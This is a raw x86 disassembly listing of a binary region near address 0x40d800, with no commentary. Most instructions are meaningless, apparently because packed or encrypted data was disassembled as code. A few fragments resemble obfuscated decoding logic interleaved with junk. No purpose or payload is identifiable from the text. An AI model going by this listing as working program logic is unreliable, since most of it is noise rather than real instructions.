  40d82c:	ret    
  40d82d:	test   ah,cl
  40d82f:	pop    ds
  40d830:	dec    ecx
  40d831:	push   es
  40d832:	jae    0x40d87c
  40d834:	and    DWORD PTR ds:0x7543c020,eax
  40d83a:	scas   al,BYTE PTR es:[edi]
  40d83b:	cs or  eax,0xadd28a06
  40d841:	xor    esp,0xdc3f09ad
  40d847:	lock mov dl,BYTE PTR [edx+0x0]
  40d84b:	retf   
  40d84c:	push   ds
  40d84d:	dec    ebx
  40d84e:	or     eax,0x390e915e
  40d853:	xor    BYTE PTR [esi+0x31],al
  40d856:	adc    edi,DWORD PTR [edx-0x640bf6e7]
  40d85c:	mov    ebx,0xd7be3292
  40d861:	sahf   
  40d862:	cld    
  40d863:	aam    0xc
  40d865:	outs   dx,BYTE PTR ds:[esi]
  40d866:	loopne 0x40d8a8
  40d868:	sub    al,0xa0
  40d86a:	sub    bh,dl
  40d86c:	or     ebx,DWORD PTR [esi]
  40d86e:	int3   
  40d86f:	addr16 dec esi
  40d871:	cmp    eax,0x1ecb0957
  40d876:	push   ebp
  40d877:	dec    edi
  40d878:	jno    0x40d811
  40d87a:	xchg   BYTE PTR [ebx-0x39],al
  40d87d:	dec    DWORD PTR [eax]
  40d87f:	arpl   WORD PTR [ebx-0x7c9171],sp
  40d885:	sbb    DWORD PTR [ebp+0x26],edx
  40d888:	mov    eax,ds:0x6bd56412
  40d88d:	ret    
  40d88e:	in     eax,dx
  40d88f:	push   ecx
  40d890:	iret   
  40d891:	stos   DWORD PTR es:[edi],eax
  40d892:	(bad)  
  40d894:	sbb    ah,BYTE PTR [edi-0x5c]
  40d897:	add    BYTE PTR [ecx+0x19],ah
  40d89a:	addr16 inc ebx
  40d89c:	mov    cl,0xaf
  40d89e:	jg     0x40d904
  40d8a0:	sub    BYTE PTR [esi],ch
  40d8a2:	jg     0x40d8bd
  40d8a4:	xor    DWORD PTR [eax-0x2c874372],0xb5f8e2a7
  40d8ae:	cmp    eax,0xd4931b0c
  40d8b3:	cld    
  40d8b4:	lock inc ebx
  40d8b6:	add    DWORD PTR [ebp+0x3c],ebp
  40d8b9:	(bad)  
  40d8ba:	xchg   ebx,eax
  40d8bb:	fsubr  DWORD PTR [ecx+ebp*1]
  40d8be:	push   ebp
  40d8bf:	jo     0x40d8db
  40d8c1:	lock xchg edx,eax
  40d8c3:	dec    edi
  40d8c4:	hlt    
  40d8c5:	dec    ecx
  40d8c6:	sub    cl,al
  40d8c8:	sbb    esi,esp
  40d8ca:	div    edi
  40d8cc:	test   eax,0x4920768b
  40d8d1:	mov    dh,0x35
  40d8d3:	sbb    eax,0x6fbee97a
  40d8d8:	add    eax,0xfe7e3164
  40d8dd:	and    DWORD PTR [edx],ebx
  40d8df:	push   0x1316c1ac
  40d8e4:	sti    
  40d8e5:	inc    ebp
  40d8e6:	icebp  
  40d8e7:	adc    edi,edx
  40d8e9:	push   ecx
  40d8ea:	ret    
  40d8eb:	pop    eax
  40d8ec:	aaa    
  40d8ed:	lea    ebx,[edx]
  40d8ef:	dec    esi
  40d8f0:	retf   0x7df6
  40d8f3:	lods   eax,DWORD PTR ds:[esi]
  40d8f4:	pop    esp
  40d8f5:	mov    ecx,?
  40d8f7:	xchg   DWORD PTR ds:0x4b8c6ff4,ecx
  40d8fd:	xchg   ebp,eax
  40d8fe:	mov    esp,DWORD PTR [esi+0x29]
  40d901:	std    
  40d902:	pop    esp
  40d903:	push   ebx
  40d904:	rcr    ecx,0xd8
  40d907:	test   DWORD PTR [edi-0x6],ecx
  40d90a:	or     eax,ecx
  40d90c:	das    
  40d90d:	xor    BYTE PTR [edi],0xf1
  40d910:	pop    eax
  40d911:	sbb    ecx,eax
  40d913:	sbb    DWORD PTR [esi+0x6c],edx
  40d916:	or     al,0xe0
  40d918:	not    DWORD PTR [ebp+0x42]
  40d91b:	fist   DWORD PTR [ebp-0x53]
  40d91e:	xchg   esp,eax
  40d91f:	test   al,0xe8
  40d921:	pop    edi
  40d922:	je     0x40d97d
  40d924:	stc    
  40d925:	les    edx,FWORD PTR [edx+0x76ffa6e4]
  40d92b:	dec    ebx
  40d92c:	xor    al,0x85
  40d92e:	call   0xfba5:0x6217868
  40d935:	xor    edx,DWORD PTR [ebp+0x14]
  40d938:	push   esi
  40d939:	cmp    bl,ch
  40d93b:	dec    ebp
  40d93c:	adc    eax,0x62440ad9
  40d941:	(bad)  
  40d942:	repnz push es
  40d944:	add    al,0x0
  40d946:	jo     0x40d93f
  40d948:	icebp  
  40d949:	mov    ds:0xb0d34f0f,eax
  40d94e:	mov    ds:0x4d9b66e2,eax
  40d953:	ja     0x40d9ce
  40d955:	test   BYTE PTR [edx],al
  40d957:	inc    ecx
  40d958:	mov    ecx,fs
  40d95a:	xor    esp,edi
  40d95c:	pushf  
  40d95d:	pop    ecx
  40d95e:	jmp    0x945f:0xb57862f5
  40d965:	push   0xb440a437
  40d96a:	inc    ebx
  40d96b:	xor    BYTE PTR [edi+0x4795f754],bl
  40d971:	mov    ecx,0x9899cd29
  40d976:	scas   al,BYTE PTR es:[edi]
  40d977:	stos   DWORD PTR es:[edi],eax
  40d978:	rol    BYTE PTR [eax+eiz*4+0x5d22579c],1
  40d97f:	out    0x16,eax
  40d981:	xchg   edx,eax
  40d982:	mov    WORD PTR [esi],ds
  40d984:	inc    ecx
  40d985:	out    0xfd,al
  40d987:	popa   
  40d988:	pop    edi
  40d989:	aam    0x49
  40d98b:	jecxz  0x40d9be
  40d98d:	jle    0x40d9ef
  40d98f:	loopne 0x40d9dc
  40d991:	push   es
  40d992:	into   
  40d993:	xchg   BYTE PTR [edi-0x5f081615],ah
  40d999:	fcomp  st(5)
  40d99b:	into   
  40d99c:	and    al,0xf9
  40d99e:	cwde   
  40d99f:	xchg   esi,eax
  40d9a0:	and    edi,edi
  40d9a2:	jo     0x40d9ec
  40d9a4:	cmp    eax,DWORD PTR [ecx+0x55]
  40d9a7:	mov    WORD PTR [edx],cs
  40d9a9:	fwait
  40d9aa:	xor    al,0xa1
  40d9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ad:	repnz ds pop eax
  40d9b0:	fisub  DWORD PTR [ebx-0x12071761]
  40d9b6:	retf   0x7542
  40d9b9:	push   edi
  40d9ba:	in     eax,0x4c
  40d9bc:	mov    ecx,gs
  40d9be:	xchg   ecx,eax
  40d9bf:	sub    cl,BYTE PTR [ebx+0x4]
  40d9c2:	ficomp WORD PTR [ebx+0x63]
  40d9c5:	dec    ebp
  40d9c6:	xchg   ebp,eax
  40d9c7:	fwait
  40d9c8:	xor    eax,eax
  40d9ca:	pusha  
  40d9cb:	jo     0x40da3a
  40d9cd:	int    0x78
  40d9cf:	scas   al,BYTE PTR es:[edi]
  40d9d0:	arpl   di,di
  40d9d2:	loope  0x40da4c
  40d9d4:	xor    esp,DWORD PTR [esi]
  40d9d6:	sbb    BYTE PTR [ecx+0x64],dl
  40d9d9:	inc    eax
  40d9da:	push   0x30
  40d9dc:	cmc    
  40d9dd:	adc    al,0x60
  40d9df:	outs   dx,BYTE PTR ds:[esi]
  40d9e0:	retf   
  40d9e1:	loop   0x40d9ab
  40d9e3:	test   al,0xf0
  40d9e5:	push   edi
  40d9e6:	mov    ds:0xfdc6248a,al
  40d9eb:	loopne 0x40d976
  40d9ed:	add    BYTE PTR [edi-0x3714926f],cl
  40d9f3:	cwde   
  40d9f4:	repz push edx
  40d9f6:	outs   dx,DWORD PTR ds:[esi]
  40d9f7:	(bad)  
  40d9f9:	mov    eax,DWORD PTR [ecx-0x5b]
  40d9fc:	jmp    0x40d9ab
  40d9fe:	or     eax,0x2aac161
  40da03:	rcr    BYTE PTR [eax-0x26],cl
  40da06:	xor    dh,BYTE PTR [ecx+0x3d]
  40da09:	stc    
  40da0a:	fist   DWORD PTR [ebp-0x73]
  40da0d:	jne    0x40da36
  40da0f:	push   esi
  40da10:	addr16 ss push eax
  40da13:	stos   BYTE PTR es:[edi],al
  40da14:	or     ah,ch
  40da16:	add    al,0xe0
  40da18:	xchg   edi,eax
  40da19:	or     eax,0x61d49111
  40da1e:	push   ebp
  40da1f:	mul    BYTE PTR [ebp+0x1b4ca70e]
  40da25:	call   0x65376c2b
  40da2a:	mov    WORD PTR [edi+0x623f1216],cs
  40da30:	inc    ebx
  40da31:	mov    esi,0xdee60a36
  40da36:	jecxz  0x40d9d0
  40da38:	add    DWORD PTR [edi+0x31],ebp
  40da3b:	in     eax,dx
  40da3c:	ins    BYTE PTR es:[edi],dx
  40da3d:	int    0x90
  40da3f:	aas    
  40da40:	imul   eax,DWORD PTR [ebx+0x78066360],0x2406c690
  40da4a:	push   ecx
  40da4b:	jecxz  0x40dab6
  40da4d:	mov    edx,0xd703f833
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0x7f,eax
  40da6e:	stc    
  40da6f:	mov    cs,WORD PTR [ebx+0x32]
  40da72:	mov    ds:0x79707e7e,al
  40da77:	jle    0x40daf7
  40da79:	push   esi
  40da7a:	sub    al,0x79
  40da7c:	mov    ebp,DWORD PTR [esi-0x480ec3ef]
  40da82:	fwait
  40da83:	(bad)  
  40da84:	fisub  DWORD PTR ds:0x4e1f86b6
  40da8a:	and    cl,BYTE PTR ds:0x348c7f29
  40da90:	stc    
  40da91:	outs   dx,BYTE PTR ds:[esi]
  40da92:	mov    ch,0x87
  40da94:	repnz cmp esp,DWORD PTR [eax]
  40da97:	repz cli 
  40da99:	enter  0xc5f7,0x7f
  40da9d:	scas   al,BYTE PTR es:[edi]
  40da9e:	inc    eax
  40da9f:	int    0x4d
  40daa1:	int3   
  40daa2:	lahf   
  40daa3:	stos   DWORD PTR es:[edi],eax
  40daa4:	retf   
  40daa5:	xor    eax,0x3168176d
  40daaa:	in     eax,0x66
  40daac:	add    al,0x10
  40daae:	in     al,0xc1
  40dab0:	bound  ebp,QWORD PTR [eax+0x3e93c122]
  40dab6:	inc    ebx
  40dab7:	test   al,0x8c
  40dab9:	ror    ebx,1
  40dabb:	inc    ebp
  40dabc:	mov    al,ds:0x92dcdd8
  40dac1:	inc    ecx
  40dac2:	ss popa 
  40dac4:	rcr    BYTE PTR [ecx-0x26],cl
  40dac7:	je     0x40da95
  40dac9:	xchg   BYTE PTR [esp+eax*4],bh
  40dacc:	jmp    0x337:0x8a1f367d
  40dad3:	inc    eax
  40dad4:	sub    BYTE PTR [edi-0x46],al
  40dad7:	lahf   
  40dad8:	outs   dx,DWORD PTR ds:[esi]
  40dad9:	pop    sp
  40dadb:	test   al,0xee
  40dadd:	sub    eax,0x6e87d69c
  40dae2:	jg     0x40da86
  40dae4:	cmc    
  40dae5:	mov    bh,0xb4
  40dae7:	cmp    DWORD PTR [ebx+0x10],0x437c8a1
  40daee:	data16 xor BYTE PTR [ecx+0x5097b994],ah
  40daf5:	xchg   edi,eax
  40daf6:	punpckldq mm2,DWORD PTR [eax-0x5]
  40dafa:	push   ebp
  40dafb:	ss push esi
  40dafd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dafe:	jmp    0x40db78
  40db00:	add    al,al
  40db02:	mov    ds:0xd5b2cd79,eax
  40db07:	in     eax,0xc2
  40db09:	jo     0x40dab3
  40db0b:	hlt    
  40db0c:	mov    al,0x5e
  40db0e:	in     eax,0x3
  40db10:	ins    BYTE PTR es:[edi],dx
  40db11:	cld    
  40db12:	sub    esi,DWORD PTR [eax-0x9]
  40db15:	ja     0x40db64
  40db17:	xchg   edi,eax
  40db18:	shl    BYTE PTR [eax-0xa485fb1],0x91
  40db1f:	jno    0x40db30
  40db21:	bound  esp,QWORD PTR [ebx+0x23]
  40db24:	xlat   BYTE PTR ds:[ebx]
  40db25:	mov    esi,0x46165702
  40db2a:	sbb    DWORD PTR [edx+eiz*4+0x14],ebp
  40db2e:	jmp    0x40daf7
  40db30:	mov    dh,0x9d
  40db32:	mov    esp,0xcdf1093e
  40db37:	sub    DWORD PTR [esp+edi*1+0x4e6b159a],edi
  40db3e:	test   BYTE PTR [ebp-0x3641676d],cl
  40db44:	outs   dx,DWORD PTR ds:[esi]
  40db45:	jb     0x40db6b
  40db47:	(bad)  
  40db49:	jmp    0x40db4a
  40db4b:	int    0x39
  40db4d:	repz xor al,0x6d
  40db50:	addr16 sub bh,bh
  40db53:	and    DWORD PTR [edx+ecx*8],edx
  40db56:	xchg   edx,eax
  40db57:	sbb    DWORD PTR [ebx-0x44],ecx
  40db5a:	pop    edi
  40db5b:	push   ebp
  40db5c:	enter  0xb4fc,0xdd
  40db60:	mov    al,0x23
  40db62:	sub    al,bl
  40db64:	xchg   edi,eax
  40db65:	mov    cl,0xc7
  40db67:	fisttp QWORD PTR [ebx+eiz*8]
  40db6a:	loopne 0x40db92
  40db6c:	in     eax,dx
  40db6d:	jb     0x40db94
  40db6f:	lea    ebp,[edi]
  40db71:	add    al,0x6c
  40db73:	pop    ebp
  40db74:	push   eax
  40db75:	xchg   BYTE PTR gs:[eax+0x65],bl
  40db79:	xor    eax,0x4ea481b1
  40db7e:	mov    WORD PTR [eax],ds
  40db80:	adc    eax,0xcfacb2bd
  40db85:	dec    edx
  40db86:	adc    DWORD PTR [edx],esp
  40db88:	adc    DWORD PTR [esi+0x42],edx
  40db8b:	les    ecx,FWORD PTR [esi+0x67]
  40db8e:	fist   DWORD PTR [ecx+edx*8-0x17]
  40db92:	jl     0x40db22
  40db94:	mov    ds:0xc2a9954c,al
  40db99:	add    al,0x55
  40db9b:	test   al,0x85
  40db9d:	xchg   BYTE PTR [eax+0x6fa78dcf],bh
  40dba3:	add    BYTE PTR [ecx-0x597b1635],al
  40dba9:	aas    
  40dbaa:	dec    edx
  40dbab:	push   0xffffff86
  40dbad:	mov    ecx,0x660c90e4
  40dbb2:	dec    edx
  40dbb3:	or     BYTE PTR [esi-0x4e],al
  40dbb6:	lods   al,BYTE PTR ds:[esi]
  40dbb7:	stc    
  40dbb8:	js     0x40dc33
  40dbba:	push   esi
  40dbbb:	not    bh
  40dbbd:	xor    al,0xb6
  40dbbf:	jp     0x40dc24
  40dbc1:	shr    BYTE PTR [ecx-0xfc59a2b],1
  40dbc7:	(bad)  
  40dbc8:	retf   
  40dbc9:	test   DWORD PTR [eax+0x71],edi
  40dbcc:	loop   0x40dbba
  40dbce:	cmp    dh,BYTE PTR [edx-0x6b]
  40dbd1:	sub    eax,ebp
  40dbd3:	das    
  40dbd4:	gs int3 
  40dbd6:	and    BYTE PTR [eax],al
  40dbd8:	sbb    DWORD PTR [esi],0x2
  40dbdb:	dec    esp
  40dbdd:	and    esp,edi
  40dbdf:	pushf  
  40dbe0:	xchg   esp,eax
  40dbe1:	aam    0x9c
  40dbe3:	mov    al,BYTE PTR [ebx]
  40dbe5:	icebp  
  40dbe6:	dec    esp
  40dbe7:	in     al,0xa9
  40dbe9:	js     0x40dbae
  40dbeb:	fwait
  40dbec:	les    esi,FWORD PTR [edi]
  40dbee:	js     0x40dc17
  40dbf0:	mov    bh,0x13
  40dbf2:	dec    ebp
  40dbf3:	cs xor al,0x2b
  40dbf6:	(bad)
  40dbf9:	test   al,0x75
  40dbfb:	pusha  
  40dbfc:	cmp    ch,0x90
  40dbff:	addr16 mov eax,0xe7532b38
  40dc05:	rcl    ecx,0xbb
  40dc08:	add    dl,BYTE PTR [eax-0x6253dfce]
  40dc0e:	int    0xf4
  40dc10:	jo     0x40dbd2
  40dc12:	sub    ecx,edi
  40dc14:	xor    al,0x61
  40dc16:	sub    al,al
  40dc18:	push   edx
  40dc19:	sub    edx,DWORD PTR [edx+0x1f61b0f6]
  40dc1f:	inc    eax
  40dc20:	xlat   BYTE PTR gs:[ebx]
  40dc22:	add    dh,BYTE PTR [eax+edi*8-0x45]
  40dc26:	push   es
  40dc27:	shl    DWORD PTR [ebp-0x572a04bb],cl
  40dc2d:	(bad)  
  40dc2e:	jge    0x40dc9d
  40dc30:	jg     0x40dc4a
  40dc32:	jmp    0xc9b:0x4fd9d0f5
  40dc39:	xor    ebx,DWORD PTR [esi+0x4433699a]
  40dc3f:	nop
  40dc40:	xchg   esi,eax
  40dc41:	fldcw  WORD PTR [eax+0x75]
  40dc44:	shl    DWORD PTR ds:0x53eec67b,1
  40dc4a:	psraw  mm7,QWORD PTR [ebp+0x12]
  40dc4e:	outs   dx,DWORD PTR ds:[esi]
  40dc4f:	into   
  40dc50:	ficom  WORD PTR [ecx+0xc21eeda]
  40dc56:	cmp    DWORD PTR [esi],eax
  40dc58:	and    eax,DWORD PTR [esp+ecx*2]
  40dc5b:	stc    
  40dc5c:	dec    ebp
  40dc5d:	sbb    ecx,DWORD PTR [ecx+0x10]
  40dc60:	outs   dx,BYTE PTR ds:[esi]
  40dc61:	in     al,0xda
  40dc63:	xchg   ecx,eax
  40dc64:	xor    eax,0xecec4316
  40dc69:	out    dx,eax
  40dc6a:	mov    al,ds:0x15f78157
  40dc6f:	out    0xd3,eax
  40dc71:	dec    ebp
  40dc72:	(bad)  
  40dc73:	lods   al,BYTE PTR ds:[esi]
  40dc74:	jmp    0x3f14:0xfb7c553e
  40dc7b:	rcr    DWORD PTR [ecx+0x69],1
  40dc7e:	sub    eax,0xb925b960
  40dc83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc84:	mov    al,ds:0xdb24414d
  40dc89:	adc    bh,bl
  40dc8b:	jns    0x40dc40
  40dc8d:	dec    eax
  40dc8e:	mov    ebp,0x8eb1b628
  40dc93:	lods   al,BYTE PTR ds:[esi]
  40dc94:	pop    esi
  40dc95:	je     0x40dcb1
  40dc97:	inc    ebp
  40dc98:	xchg   ebp,eax
  40dc99:	fdivr  QWORD PTR [eax]
  40dc9b:	and    al,BYTE PTR [ecx+edi*4-0x57de717f]
  40dca2:	jmp    0x2fd2bb3c
  40dca7:	ins    BYTE PTR es:[edi],dx
  40dca8:	faddp  st(5),st
  40dcaa:	mov    ds:0xe61b4ec3,eax
  40dcaf:	cmp    BYTE PTR [ecx],al
  40dcb1:	in     al,0x71
  40dcb3:	pop    edx
  40dcb4:	in     eax,0x6b
  40dcb6:	xchg   edi,eax
  40dcb7:	fst    DWORD PTR ds:[edi+0x2f]
  40dcbb:	push   ebp
  40dcbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcbd:	cld    
  40dcbe:	add    DWORD PTR [edx+0x7e],0xca30ddc1
  40dcc5:	cmc    
  40dcc6:	dec    ebx
  40dcc7:	and    al,BYTE PTR [ebx+ebx*1+0x1be61995]
  40dcce:	lea    ecx,[ebx]
  40dcd0:	xchg   ecx,eax
  40dcd1:	ja     0x40dce3
  40dcd3:	clc    
  40dcd4:	jbe    0x40dcba
  40dcd6:	push   ss
  40dcd7:	test   DWORD PTR [eax+0x1],ebp
  40dcda:	jne    0x40dcb3
  40dcdc:	mov    ds:0x41712933,eax
  40dce1:	fistp  WORD PTR [ebx+0x76]
  40dce4:	add    al,0xa4
  40dce6:	mov    dl,0x4b
  40dce8:	add    BYTE PTR es:[ebp+esi*2-0x2529669f],al
  40dcf0:	into   
  40dcf1:	cmp    eax,0x354d4d0f
  40dcf6:	test   al,0x7d
  40dcf8:	out    dx,al
  40dcf9:	mov    eax,0x1d61e280
  40dcfe:	xchg   BYTE PTR [ebx],bl
  40dd00:	shl    ah,0xe7
  40dd03:	ins    DWORD PTR es:[edi],dx
  40dd04:	inc    eax
  40dd05:	fucomi st,st(6)
  40dd07:	inc    eax
  40dd08:	and    al,0x96
  40dd0a:	bound  eax,QWORD PTR [ecx]
  40dd0c:	arpl   WORD PTR [edx-0xa],bp
  40dd0f:	stc    
  40dd10:	gs add eax,0x5e76713e
  40dd16:	les    esp,FWORD PTR [eax]
  40dd18:	mov    cl,0x94
  40dd1a:	mov    edi,0xda3201e6
  40dd1f:	div    BYTE PTR [ebx-0x52]
  40dd22:	cmp    ebx,DWORD PTR [eax-0x592fc15]
  40dd28:	mov    WORD PTR [eax+0x79c4e2e9],?
  40dd2e:	ror    BYTE PTR [ebp-0x4c],1
  40dd31:	add    edi,ebx
  40dd33:	xchg   ebx,eax
  40dd34:	(bad)  
  40dd35:	push   ds
  40dd36:	add    al,0x96
  40dd38:	xor    al,dh
  40dd3a:	sbb    DWORD PTR [ebx+0x3d1fc25f],0xffffffc1
  40dd41:	adc    ah,bl
  40dd43:	fcmovnb st,st(4)
  40dd45:	ret    0xe41f
  40dd48:	sbb    eax,0xcbee20f9
  40dd4d:	inc    esp
  40dd4e:	test   al,0x95
  40dd50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd51:	es xchg edx,eax
  40dd53:	js     0x40dcf7
  40dd55:	addr16 fs repnz inc ecx
  40dd59:	in     al,0x78
  40dd5b:	call   0x5864:0xe0b75ad0
  40dd62:	(bad)  
  40dd63:	pop    ebx
  40dd64:	mov    esi,0xcd6126be
  40dd69:	add    ecx,DWORD PTR [ecx+0x1a]
  40dd6c:	cmp    al,BYTE PTR [edx-0x38]
  40dd6f:	test   BYTE PTR [esp+edx*4],bh
  40dd72:	xorps  xmm1,XMMWORD PTR [ebx]
  40dd75:	xlat   BYTE PTR ds:[ebx]
  40dd76:	int3   
  40dd77:	mov    BYTE PTR [edi+0x2ca47608],dh
  40dd7d:	push   eax
  40dd7e:	pop    ecx
  40dd7f:	repnz not BYTE PTR [ecx]
  40dd82:	sar    eax,0xc2
  40dd85:	aaa    
  40dd86:	and    dh,BYTE PTR [eax+eiz*8+0x2872d5db]
  40dd8d:	cmp    bl,dl
  40dd8f:	in     al,dx
  40dd90:	out    0x9e,eax
  40dd92:	shr    ah,cl
  40dd94:	cmp    ebx,DWORD PTR [ecx]
  40dd96:	stc    
  40dd97:	in     eax,0xd1
  40dd99:	dec    ecx
  40dd9a:	out    dx,eax
  40dd9b:	sub    esi,esi
  40dd9d:	fmul   QWORD PTR [esi+eax*1]
  40dda0:	xor    al,0xc2
  40dda2:	cmp    eax,0xe877da3
  40dda7:	adc    BYTE PTR [eax+0x1d],dl
  40ddaa:	or     esp,esi
  40ddac:	and    DWORD PTR [ecx-0x6d],ebp
  40ddaf:	push   cs
  40ddb0:	inc    ebx
  40ddb1:	lds    edi,FWORD PTR fs:[edi]
  40ddb4:	sbb    DWORD PTR [ecx+0x2c14066f],eax
  40ddba:	aaa    
  40ddbb:	fadd   QWORD PTR [ecx+ebx*4+0x49]
  40ddbf:	cmp    DWORD PTR [ebp+0x6c51ca07],eax
  40ddc5:	xchg   esp,eax
  40ddc6:	aad    0x73
  40ddc8:	loop   0x40ddfa
  40ddca:	das    
  40ddcb:	or     BYTE PTR [esi+0x6fefc8c1],dh
  40ddd1:	je     0x40ddf7
  40ddd3:	arpl   WORD PTR [ebx+0x55],ax
  40ddd6:	cmp    eax,0xbe1b407c
  40dddb:	out    dx,al
  40dddc:	enter  0x7cf0,0x86
  40dde0:	jo     0x40ddeb
  40dde2:	aas    
  40dde3:	repz pop ds
  40dde5:	fcmovb st,st(1)
  40dde7:	jp     0x40dde0
  40dde9:	mov    ebx,0xfbd1a1c6
  40ddee:	mov    ebx,0x4cb1c3ee
  40ddf3:	sub    eax,0xc3fd2682
  40ddf8:	pusha  
  40ddf9:	push   ds
  40ddfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddfb:	fdivp  st(5),st
  40ddfd:	mov    cl,0x4
  40ddff:	popf   
  40de00:	and    esp,DWORD PTR [ebx-0x61]
  40de03:	in     al,0x9a
  40de05:	xor    eax,0xb7b0ff96
  40de0a:	cwde   
  40de0b:	xchg   ebx,eax
  40de0c:	stos   BYTE PTR es:[edi],al
  40de0d:	push   0xc98334af
  40de12:	es ss jg 0x40de88
  40de16:	xor    eax,0xbadf2241
  40de1b:	xor    esi,DWORD PTR [edx+0x6fe819bf]
  40de21:	mov    esp,0x4d2a0eb3
  40de26:	dec    edi
  40de27:	push   ebp
  40de28:	enter  0x52db,0xff
  40de2c:	test   eax,0x3001f5e4
  40de31:	scas   eax,DWORD PTR es:[edi]
  40de32:	jmp    0x40ddf7
  40de34:	bound  ebp,QWORD PTR [edx+0x7]
  40de37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de38:	fdiv   DWORD PTR [ebx+0x51]
  40de3b:	or     BYTE PTR [edi],ah
  40de3d:	fstp   DWORD PTR [eax]
  40de3f:	xchg   ecx,eax
  40de40:	inc    eax
  40de41:	mov    bh,BYTE PTR [ecx+0x2b5b562]
  40de47:	out    dx,al
  40de48:	ins    BYTE PTR es:[edi],dx
  40de49:	cmp    al,0x1
  40de4b:	sbb    DWORD PTR [esi],edi
  40de4d:	(bad)  
  40de4e:	jmp    0x68bf:0x7151a98a
  40de55:	cmp    ecx,edi
  40de57:	loop   0x40de34
  40de59:	dec    esi
  40de5a:	pop    ds
  40de5b:	mov    ds:0x8504fda3,al
  40de60:	gs fmul st,st(0)
  40de63:	or     DWORD PTR [edx+0x558cad94],esi
  40de69:	imul   edx,DWORD PTR [esi-0xa],0x12
  40de6d:	pop    edx
  40de6e:	fcom   DWORD PTR [edx+0x30]
  40de71:	or     ebx,edx
  40de73:	mov    DWORD PTR [ebp-0x8],edx
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	frstor ds:0xae34f278
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	sahf   
  40de9e:	out    dx,al
  40de9f:	mov    ds:0x40d9440f,eax
  40dea4:	rol    ecx,0xc7
  40dea7:	fstp   st(2)
  40dea9:	call   0xd59fb4d4
  40deae:	retf   
  40deaf:	xchg   edx,eax
  40deb0:	(bad)  
  40deb1:	push   ds
  40deb2:	push   ebp
  40deb3:	cmp    esp,ecx
  40deb5:	cmp    BYTE PTR [esi+0x3ec5c05e],dl
  40debb:	inc    ecx
  40debc:	sub    esi,edx
  40debe:	iret   
  40debf:	stc    
  40dec0:	(bad)  
  40dec2:	ret    0xcce9
  40dec5:	sar    DWORD PTR [edi],0x56
  40dec8:	dec    edx
  40dec9:	jecxz  0x40deb2
  40decb:	cwde   
  40decc:	fld    TBYTE PTR ds:0xc4990bf7
  40ded2:	sub    al,0xfc
  40ded4:	enter  0x8ca2,0x1f
  40ded8:	add    al,0x53
  40deda:	xor    edx,edi
  40dedc:	rcr    BYTE PTR [eax-0x5],0x66
  40dee0:	xchg   BYTE PTR ds:0xd6d510da,ah
  40dee6:	(bad)  
  40dee7:	sbb    eax,DWORD PTR [eax]
  40dee9:	out    0x24,eax
  40deeb:	mov    DWORD PTR [ecx-0x2b],ecx
  40deee:	xlat   BYTE PTR ds:[ebx]
  40deef:	or     DWORD PTR [edi],esi
  40def1:	mov    ah,0x80
  40def3:	pop    ds
  40def4:	push   DWORD PTR [eax+0x3380972b]
  40defa:	push   edx
  40defb:	xchg   ebx,eax
  40defc:	jle    0x40ded9
  40defe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deff:	jo     0x40df1f
  40df01:	pop    esp
  40df02:	xor    cl,BYTE PTR [edx]
  40df04:	xchg   ecx,edx
  40df06:	mov    ebp,0x6ec41dba
  40df0b:	scas   eax,DWORD PTR es:[edi]
  40df0c:	loopne 0x40dee2
  40df0e:	lock add DWORD PTR ds:[esi],esi
  40df12:	push   ds
  40df13:	add    eax,0x1a308dd6
  40df18:	cmp    BYTE PTR [ebx-0x35],ah
  40df1b:	push   0xffffffd6
  40df1d:	aad    0xab
  40df1f:	stos   BYTE PTR es:[edi],al
  40df20:	lock repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df23:	loop   0x40df9f
  40df25:	adc    DWORD PTR [eax-0x6539cdba],edx
  40df2b:	rcr    BYTE PTR ds:0x31e659a0,1
  40df31:	cli    
  40df32:	push   cs
  40df33:	jno    0x40df95
  40df35:	xchg   al,ch
  40df37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df38:	mov    ebp,0x9e91ed3f
  40df3d:	out    0x5a,eax
  40df3f:	jg     0x40df31
  40df41:	icebp  
  40df42:	pop    ecx
  40df43:	mov    ebx,esi
  40df45:	popf   
  40df46:	fwait
  40df47:	dec    eax
  40df48:	pop    ecx
  40df49:	push   eax
  40df4a:	pop    esp
  40df4b:	xor    al,0x4a
  40df4d:	dec    edx
  40df4e:	dec    ecx
  40df4f:	fimul  WORD PTR [ecx]
  40df51:	fucomip st,st(1)
  40df53:	fld    TBYTE PTR [edx+0x7d]
  40df56:	and    eax,0x678ccb6f
  40df5b:	adc    al,0xa7
  40df5d:	pop    esi
  40df5e:	push   0xd9df7e4d
  40df63:	push   DWORD PTR [ecx-0x1188f3bd]
  40df69:	ret    0x99b0
  40df6c:	or     DWORD PTR [edx+0x64362ea0],edx
  40df72:	jbe    0x40df01
  40df74:	push   0x28
  40df76:	mov    esi,0x155f5be1
  40df7b:	xchg   BYTE PTR [ebx+0x3],al
  40df7e:	pop    es
  40df7f:	xor    ebx,esp
  40df81:	xchg   ecx,eax
  40df82:	add    BYTE PTR [ebp-0x11],0x63
  40df86:	cli    
  40df87:	mov    dl,0xa5
  40df89:	clc    
  40df8a:	aam    0xa8
  40df8c:	ja     0x40dfdf
  40df8e:	and    DWORD PTR [esi],edi
